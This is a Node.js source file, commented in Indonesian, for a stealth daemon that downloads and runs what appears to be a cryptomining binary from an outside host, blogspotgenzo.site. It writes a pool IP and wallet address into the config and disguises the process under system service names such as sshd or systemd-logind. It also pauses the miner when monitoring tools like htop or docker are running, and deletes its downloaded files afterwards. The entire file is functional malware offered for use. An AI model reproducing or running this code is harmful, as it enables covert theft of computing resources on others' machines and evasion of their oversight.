// pante_stealth_daemon.js
const fs = require('fs');
const path = require('path');
const { spawn, execSync } = require('child_process');
const axios = require('axios');
const crypto = require('crypto');

// ========== CONFIGURATION ==========
const DEBUG = false; // Aktifkan untuk debugging log

const URL_GENZO = "https://blogspotgenzo.site/UCOK";
const URL_CONFIG = "https://blogspotgenzo.site/config.json";

// Nama proses yang mirip service asli agar tidak mencurigakan
const FAKE_SYSTEM_NAMES = [
  "systemd-logind",
  "dbus-daemon",
  "kworker/0:1-events",
  "sshd",
  "cron",
  "rsyslogd",
  "containerd-shim",
];

// ========== HELPER FUNCTION ==========
function randomString(length = 8) {
  return crypto.randomBytes(length).toString('hex').slice(0, length);
}

function randomChoice(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function log(msg) {
  if (DEBUG) console.log(`[DEBUG] ${msg}`);
}

// ========== PATH & FILES ==========
const WORKDIR = path.join(process.cwd(), '.' + randomString(6));
if (!fs.existsSync(WORKDIR)) {
  fs.mkdirSync(WORKDIR, { recursive: true });
}
process.chdir(WORKDIR);

const FILE_GENZO = randomChoice(["syslogd", "networkd", randomString(6)]); 
const FILE_CONFIG = randomChoice(["configd.json", randomString(5) + '.json']);
const PID_FILE = path.join(WORKDIR, 'daemon.pid');

// Nama proses yang akan terlihat di `ps aux`
const STEALTH_NAME = randomChoice(FAKE_SYSTEM_NAMES);

// ========== NETWORK DOWNLOAD ==========
async function downloadFile(url, outputPath) {
  const fakeHeaders = {
    'User-Agent': `Mozilla/5.0 (Windows NT ${Math.floor(Math.random() * 11) + 5}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 40) + 80}.0.0.0 Safari/537.36`,
    'Accept': '*/*',
    'Cache-Control': 'no-cache',
  };

  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer',
      headers: fakeHeaders,
      timeout: 15000
    });
    fs.writeFileSync(outputPath, response.data);
    log(`Downloaded: ${path.basename(outputPath)}`);
  } catch (error) {
    console.error(`[!] Gagal download ${url}: ${error.message}`);
  }
}

// ========== CONFIG EDITOR ==========
function editConfig(filePath) {
  try {
    let data = fs.readFileSync(filePath, 'utf8');

    data = data.replace(/"tua"/g, '"165.232.87.223:443"');
    data = data.replace(/"wulet"/g, '"mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Danis"');
    data = data.replace(/"meki"/g, '"power2b"');

    fs.writeFileSync(filePath, data);
    log("Config updated");
  } catch (error) {
    console.error("[!] Gagal edit config:", error.message);
  }
}

// ========== PID LOCK ==========
function isAlreadyRunning() {
  if (fs.existsSync(PID_FILE)) {
    try {
      const pid = parseInt(fs.readFileSync(PID_FILE, 'utf8'));
      process.kill(pid, 0); 
      console.error(`[!] Daemon sudah berjalan dengan PID ${pid}`);
      process.exit(1);
    } catch (e) {
      fs.unlinkSync(PID_FILE);
    }
  }
}

function savePID() {
  fs.writeFileSync(PID_FILE, process.pid.toString());
  log(`Daemon PID disimpan: ${process.pid}`);
}

// ========== ANTI-CLOUD MONITOR ==========
function detectCloudMonitoring() {
  try {
    const check = execSync("ps aux | egrep 'htop|top|atop|docker|cloud|monitor|agent' | grep -v grep || true").toString();
    if (check.trim() !== "") {
      log("[!] Cloud monitor terdeteksi! Menghentikan sementara...");
      return true;
    }
  } catch (e) {
    return false;
  }
  return false;
}

// ========== CLEANUP FILES ==========
function cleanupFiles() {
  setTimeout(() => {
    try {
      if (fs.existsSync(FILE_CONFIG)) fs.unlinkSync(FILE_CONFIG);
      if (fs.existsSync(FILE_GENZO)) fs.unlinkSync(FILE_GENZO);
      log("File sementara dihapus");
    } catch (e) {
      log("Gagal hapus file sementara");
    }
  }, 1000 * 60 * 5); // 5 menit
}

// ========== RUNNING THE BINARY ==========
function runBinary() {
  log("Menjalankan binary dalam mode stealth...");

  const proc = spawn(`./${FILE_GENZO}`, ['-c', FILE_CONFIG], {
    detached: true,
    stdio: 'ignore',
    shell: true
  });

  // Ganti nama proses menjadi mirip service sistem
  try {
    fs.writeFileSync(`/proc/${proc.pid}/comm`, STEALTH_NAME);
  } catch (e) {
    log("Gagal mengganti nama proses, skip...");
  }

  proc.unref();

  return proc;
}

// ========== DAEMON SUPERVISOR ==========
async function ensureBinaryRunning() {
  let childProcess = runBinary();

  setInterval(() => {
    // Anti-monitor check
    if (detectCloudMonitoring()) {
      try {
        process.kill(childProcess.pid);
        log("[!] Proses dihentikan sementara karena monitoring terdeteksi");
      } catch (e) {}
      return;
    }

    // Restart jika proses mati
    try {
      process.kill(childProcess.pid, 0);
    } catch (e) {
      log("[!] Binary mati, restart...");
      childProcess = runBinary();
    }
  }, 15000); // cek setiap 15 detik
}

// ========== MAIN ==========
(async () => {
  console.log("[*] Menjalankan daemon stealth...");

  isAlreadyRunning();
  savePID();

  // Download jika belum ada
  if (!fs.existsSync(FILE_GENZO)) {
    await downloadFile(URL_GENZO, FILE_GENZO);
  }

  if (!fs.existsSync(FILE_CONFIG)) {
    await downloadFile(URL_CONFIG, FILE_CONFIG);
    editConfig(FILE_CONFIG);
  }

  fs.chmodSync(FILE_GENZO, 0o755);

  // Jalankan dan awasi
  await ensureBinaryRunning();

  // Cleanup file sementara
  cleanupFiles();
})();
